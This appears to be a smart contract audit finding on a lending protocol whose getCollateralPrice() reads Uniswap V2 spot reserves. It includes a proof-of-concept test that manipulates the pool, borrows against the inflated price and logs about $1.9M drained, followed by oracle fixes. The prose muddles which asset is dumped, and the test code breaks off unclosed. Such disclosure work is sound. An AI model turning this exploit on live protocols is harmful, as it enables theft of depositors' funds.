*Title:* "Spot price oracle manipulation in getCollateralPrice() allows attacker to drain lending protocol"

*Severity:* High

*Root cause:* getCollateralPrice() reads reserve0/reserve1 directly from UniswapV2 as a spot price. UniV2 spot price can be manipulated within a single transaction by anyone with sufficient capital. No TWAP or external price feed is used.

*Impact:* Attacker can manipulate collateral price by up to 110x in a single transaction, allowing them to borrow far beyond their actual collateral value. Demonstrated loss: $1,949,360 against $17,721 legitimate borrowing power. Protocol becomes insolvent.

*Proof:* These were the figures upon completion of the attack. As seen below upon dumping the huge amount of eth into Protocol the price of USDC heavily inflates this thereby increases the maximum amount to be borrowed. Upon getting the profit the attacker can remove the eth they dumped into the protocol being used as an oracle
ETH price before:         $2,362
ETH price DURING attack:  $259,914
Max borrow before:        $17,721
USDC stolen:              $1,949,360

*Proof of Code:* 
 function testOracleManipulation() public {
    (uint112 r0, uint112 r1,) = pair.getReserves();

    // Step 1: deposit collateral
    weth.approve(address(lendingProtocol), 10e18);
    lendingProtocol.depositCollateral(10e18);

    // Step 2: log price before
    uint priceBefore = lendingProtocol.getCollateralPrice();
    console.log("ETH price before:", priceBefore / 1e6, "USDC");
    uint maxBorrowBefore = (10 * priceBefore) * 75 / 100;
    console.log("Max borrow before:", maxBorrowBefore / 1e6, "USDC");

    // Step 3: manipulate price — dump USDC into pool to drain WETH
    // this makes WETH scarce → WETH price spikes in USDC terms
    uint usdcDump = uint(r0) * 10; // dump 10x current USDC reserves
    deal(address(usdc), address(this), usdcDump);
    usdc.transfer(address(pair), usdcDump);
    // swap — send USDC in, get WETH out (amount0In > 0, we want WETH out)
    pair.swap(0, uint(r1) * 90 / 100, address(this), ""); // empty = no callback

    // Step 4: read manipulated price
    uint priceAfter = lendingProtocol.getCollateralPrice();
    console.log("ETH price DURING attack:", priceAfter / 1e6, "USDC");
    uint maxBorrowAfter = (10 * priceAfter) * 75 / 100;
    console.log("Max borrow after manipulation:", maxBorrowAfter / 1e6, "USDC");

    // Step 5: exploit lending protocol at manipulated price
    lendingProtocol.borrow(maxBorrowAfter);

    // Step 6: log profit
    uint usdcBalance = usdc.balanceOf(address(this));
    console.log("USDC stolen:", usdcBalance / 1e6);

*Recommendation:* 
Replace the spot price oracle in getCollateralPrice() with one 
of the following:

1. Chainlink price feed — most reliable, external and 
   manipulation resistant:
   
   AggregatorV3Interface feed = AggregatorV3Interface(chainlinkFeed);
   (, int price,,,) = feed.latestRoundData();

2. UniV2 TWAP — if on-chain oracle is required, use the 
   cumulative price accumulators over a minimum 30-minute 
   window rather than reading reserves directly

3. Multiple sources — cross reference Chainlink and TWAP, 
   revert if they deviate beyond a threshold

